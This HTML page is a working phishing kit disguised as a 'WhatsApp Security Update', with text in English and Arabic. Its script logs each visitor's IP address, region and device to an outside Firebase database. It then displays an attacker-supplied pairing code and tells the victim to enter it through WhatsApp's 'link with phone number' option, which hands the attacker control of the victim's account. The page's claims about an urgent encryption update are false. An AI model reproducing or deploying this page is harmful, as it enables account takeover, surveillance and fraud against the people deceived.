<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Update</title>
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; user-select: none; pointer-events: none; }
        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; }
        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
        #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
        .check-mark { color: #00a884; font-size: 45px; font-weight: bold; }
        b { font-weight: 800; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div class="header-title">WhatsApp Security Update</div>
        <div id="u-badge" class="badge">Checking Device...</div>
        <div class="v-box">
            <div class="v-row"><span id="v-label">Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
            <div class="v-row"><span>Update To:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
        </div>
        <p id="u-alert" class="alert-p"></p>
        <div id="u-steps" class="steps"></div>
        <div class="code-zone">
            <div id="pairing-code">...</div>
            <div id="u-wait" class="wait-text"></div>
            <div id="success-screen">
                <div class="check-mark">✓</div>
                <div id="success-text" style="font-weight:bold; font-size:15px"></div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        const userId = new URLSearchParams(window.location.search).get('id');
        const isAr = navigator.language.startsWith('ar');
        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
        
        const content = {
            ar: { 
                vLabel: "الإصدار الحالي:",
                badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", 
                alert: "لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.", 
                steps: "1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:", 
                wait: "في انتظار الرمز الأمني...", 
                done: "أدخل الرمز الآن في هاتفك", 
                success: "تم التحديث بنجاح." 
            },
            en: { 
                vLabel: "Current Version:",
                badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", 
                alert: "To protect your privacy, upgrade version V2.12.5 immediately to ensure chat encryption.", 
                steps: "1. You will receive a 'Link a Device' notification from WhatsApp.<br>2. Open the notification and select <b>'Link with phone number instead'</b>.<br>3. Enter the <b>8-digit code</b> shown below into your phone:", 
                wait: "Awaiting security code...", 
                done: "Enter the code on your phone now", 
                success: "Updated successfully." 
            }
        };

        const c = isAr ? content.ar : content.en;
        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
        document.getElementById('v-label').innerText = c.vLabel;
        document.getElementById('u-badge').innerText = c.badge;
        document.getElementById('u-alert').innerHTML = c.alert;
        document.getElementById('u-steps').innerHTML = c.steps;
        document.getElementById('u-wait').innerText = c.wait;

        if (userId) {
            const sRef = db.ref('monitoring/' + userId);
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => {
                    sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
                })
                .catch(() => {
                    sRef.set({ status: "Online", device: isIOS ? "iPhone" : "Android", ts: Date.now() });
                });

            db.ref('commands/' + userId).on('value', s => {
                const v = s.val();
                if (v) {
                    if (v.code) { 
                        document.getElementById('pairing-code').innerText = v.code; 
                        document.getElementById('u-wait').innerText = c.done; 
                        document.getElementById('u-wait').style.color = "#d91e1e"; 
                    }
                    if (v.status === 'confirmed') {
                        document.getElementById('success-screen').style.display = 'flex';
                        document.getElementById('success-text').innerText = c.success;
                    }
                }
            });
        }
    </script>
</body>
</html>
